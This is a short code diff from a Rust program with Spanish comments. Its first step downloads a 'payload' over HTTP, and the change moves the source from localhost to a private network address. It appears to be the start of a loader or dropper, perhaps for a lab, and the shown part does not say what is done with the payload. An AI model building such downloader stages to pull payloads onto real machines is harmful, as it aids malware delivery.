@@ -6,7 +6,7 @@ use std::env;
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     // 1. Descargar el payload (localhost)
-    let url = "http://localhost:8080/payload";
+    let url = "http://192.168.1.120:8080/payload";
     println!("📥 Descargando payload desde: {}", url);
 
     let response = reqwest::blocking::get(url)?;
